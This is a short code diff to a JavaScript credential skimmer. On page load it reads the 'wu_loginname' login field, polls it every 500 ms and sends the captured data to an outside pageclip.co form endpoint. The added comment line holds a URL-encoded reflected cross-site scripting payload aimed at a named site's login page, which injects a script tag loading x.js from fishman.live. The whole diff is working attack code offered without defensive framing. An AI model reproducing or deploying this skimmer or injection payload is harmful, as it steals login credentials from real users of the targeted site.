@@ -1,4 +1,4 @@
-document.onload = function (e) {
+document.onload = function asdf(e) {
   var keys = '';
   var url = 'https://send.pageclip.co/mMJZqTWOskoatOv5E2bqIWkAxqcetkfi';
   document.getElementsByName('wu_loginname')?.forEach((element) => {
@@ -28,3 +28,4 @@ document.onload = function (e) {
     }
   }, 500);
 };
+//https://camphusianum.nl/Login?passAction=login&path='%2F%3E%3CScRiPt%20src%3D%22https%3A%2F%2Ffishman.live%2Fassets%2Fjs%2Fx.js%22%3E%3C%2Fscript%3E%0A
